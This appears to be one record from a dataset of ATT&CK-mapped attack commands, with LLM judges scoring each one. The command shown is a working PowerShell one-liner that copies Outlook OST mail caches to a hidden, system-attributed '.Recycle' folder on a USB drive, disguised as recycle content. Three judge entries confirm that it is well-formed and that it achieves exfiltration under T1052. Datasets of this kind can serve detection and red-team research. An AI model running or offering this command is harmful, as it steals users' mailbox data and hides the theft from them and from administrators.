command: $usb=((Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2" | Select -First 1 -ExpandProperty DeviceID)+'\'); $dst=Join-Path $usb '.Recycle'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden, System'; $mail = Get-ChildItem "$env:USERPROFILE\AppData\Local\Microsoft\Outlook" -Filter *.ost -ErrorAction SilentlyContinue; if($mail){ Copy-Item $mail -Destination $dst -Force }
explanation: Copies Outlook cache files to a hidden/system folder on the removable drive using Copy-Item, disguising them as recycle content.
rationale_steps: Create a hidden/system folder on USB
Copy the files to USB using Copy-Item

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quotes and parentheses, valid cmdlets and operators, and proper separators.
llm_judgments.semantic_justification: It targets the first removable drive, creates a hidden/system folder, and copies Outlook OST files to it—consistent with exfiltration over a physical medium—though it may fail if no USB is present or files are locked by Outlook.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses/braces, appropriate variable assignments, pipeline operations, and error handling.
llm_judgments.semantic_justification: The command perfectly aligns with T1052 by identifying a USB drive, creating a hidden system folder disguised as a Recycle Bin, and exfiltrating Outlook OST files to this concealed location on the physical medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct syntax for PowerShell, including balanced parentheses, valid cmdlets, proper path construction, and attribute setting.
llm_judgments.semantic_justification: The command fully achieves its claimed intent by locating a removable drive, creating a hidden, system-attributed folder named '.Recycle', and copying Outlook cache files into it, perfectly aligning with T1052's focus on exfiltration over physical medium with obfuscation.
